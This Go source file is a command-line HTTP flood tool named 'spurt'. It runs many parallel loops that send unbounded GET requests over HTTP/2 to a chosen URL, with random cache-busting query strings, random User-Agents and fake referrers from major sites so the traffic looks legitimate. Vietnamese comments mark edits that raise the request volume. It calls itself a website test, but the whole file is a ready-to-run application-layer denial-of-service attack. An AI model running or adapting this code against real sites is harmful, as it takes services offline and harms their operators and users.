package main

import (
	"context"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/buptmiao/parallel"
	"github.com/corpix/uarand"
	"github.com/gookit/color"
	"golang.org/x/net/http2"
)

const (
	version      = "v1.4.0"
	blockSize    = 3
	maxBlockSize = 7
)

var (
	banner = fmt.Sprintf(`
                          __
   _________  __  _______/ /_
  / ___/ __ \/ / / / ___/ __/
 (__  ) /_/ / /_/ / /  / /_
/____/ .___/\__,_/_/   \__/
    /_/                      ` + version)

	referrers = []string{
		"https://www.google.com/?q=",
		"https://www.facebook.com/",
		"https://help.baidu.com/searchResult?keywords=",
		"https://steamcommunity.com/market/search?q=",
		"https://www.youtube.com/",
		"https://www.bing.com/search?q=",
		"https://r.search.yahoo.com/",
		"https://www.ted.com/search?q=",
		"https://play.google.com/store/search?q=",
		"https://vk.com/profile.php?auto=",
		"https://www.usatoday.com/search/results?q=",
	}

	hostname    string
	paramJoiner string
	threads     int
	check       bool
)

func buildBlock(size int) string {
	var builder strings.Builder
	for i := 0; i < size; i++ {
		builder.WriteRune(rune(rand.Intn(25) + 65))
	}
	return builder.String()
}

func fetchIP() {
	ip, err := http.Get("https://ipinfo.tw/")
	if err != nil {
		fmt.Println(err)
		return
	}
	defer ip.Body.Close()
	body, err := io.ReadAll(ip.Body)
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Printf("\n%s\n", body)
}

func get(reqCount *uint64, ctx context.Context, timeout time.Duration) {
	if strings.ContainsRune(hostname, '?') {
		paramJoiner = "&"
	} else {
		paramJoiner = "?"
	}

	c := http.Client{
		Transport: &http2.Transport{},
	}

	req, err := http.NewRequest("GET", hostname+paramJoiner+buildBlock(rand.Intn(maxBlockSize)+blockSize)+"="+buildBlock(rand.Intn(maxBlockSize)+blockSize), nil)
	if err != nil {
		fmt.Println(err)
		return
	}

	req.Header.Set("User-Agent", uarand.GetRandom())
	req.Header.Add("Pragma", "no-cache")
	req.Header.Add("Cache-Control", "no-store, no-cache")
	req.Header.Set("Referer", referrers[rand.Intn(len(referrers))]+buildBlock(rand.Intn(5)+5))
	req.Header.Set("Keep-Alive", fmt.Sprintf("%d", rand.Intn(10)+100))
	req.Header.Set("Connection", "keep-alive")

	startTime := time.Now()

	resp, err := c.Do(req.WithContext(ctx))

	atomic.AddUint64(reqCount, 1)

	elapsedTime := time.Since(startTime)

	select {
	case <-ctx.Done():
		color.Red.Printf("Timeout after %s\n", timeout)
	case <-time.After(timeout):
		color.Red.Printf("Timeout after %s (elapsed time: %s)\n", timeout, elapsedTime)
	default:
		if err != nil {
			color.Red.Printf("Error: %v (elapsed time: %s)\n", err, elapsedTime)
		} else {
			color.Green.Printf("OK (elapsed time: %s)\n", elapsedTime)
			defer resp.Body.Close()
		}
	}
}

func loop(reqCount *uint64, wg *sync.WaitGroup, ctx context.Context, timeout time.Duration) {
	defer wg.Done()

	for {
		// Thay đổi: Tăng số lượng requests trong mỗi vòng lặp
		for i := 0; i < numRequestsPerLoop; i++ {
			get(reqCount, ctx, timeout)
		}
	}
}

var (
	numRequestsPerLoop = 10
	requestTimeout     = 3500 * time.Millisecond
)

func printHelp() {
	fmt.Println("\nUsage:")
	fmt.Println("  ./spurt --hostname <url> [options]")
	fmt.Println("\nOptions:")
	flag.PrintDefaults()
	fmt.Println("\nExample:")
	fmt.Println("  ./spurt --hostname https://example.com --threads 5")
}

func main() {
	color.Cyan.Println(banner)
	color.Cyan.Println("\n\t\tgithub.com/zer-far\n")

	flag.StringVar(&hostname, "hostname", "", "URL of the website to test")
	flag.IntVar(&threads, "threads", 10, "Number of threads")

	// Thay đổi: Thêm flag để điều chỉnh số lượng requests trong mỗi vòng lặp
	flag.IntVar(&numRequestsPerLoop, "requests-per-loop", 1000, "Number of requests per loop")

	// Thay đổi: Thêm flag để điều chỉnh thời gian timeout
	flag.DurationVar(&requestTimeout, "timeout", 3500*time.Millisecond, "Request timeout duration")

	flag.BoolVar(&check, "check", false, "Enable IP address check")
	flag.Usage = printHelp
	flag.Parse()

	if check {
		fetchIP()
	}

	if len(hostname) == 0 {
		color.Red.Println("Missing hostname.")
		flag.Usage()
		os.Exit(1)
	}

	if threads <= 0 {
		fmt.Println("Number of threads must be greater than 0.")
		os.Exit(1)
	}

	color.Yellow.Println("Press control+c to stop")
	time.Sleep(2 * time.Second)

	start := time.Now()

	var reqCount uint64
	var wg sync.WaitGroup

	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	ctx, cancel := context.WithCancel(context.Background())
	go func() {
		<-c
		cancel()
		color.Blue.Println("\nAttempted to send", reqCount, "requests in", time.Since(start))
		os.Exit(0)
	}()

	p := parallel.NewParallel()
	for i := 0; i < threads; i++ {
		wg.Add(1)
		p.Register(func() { loop(&reqCount, &wg, ctx, requestTimeout) })
	}
	p.Run()

	wg.Wait()
}
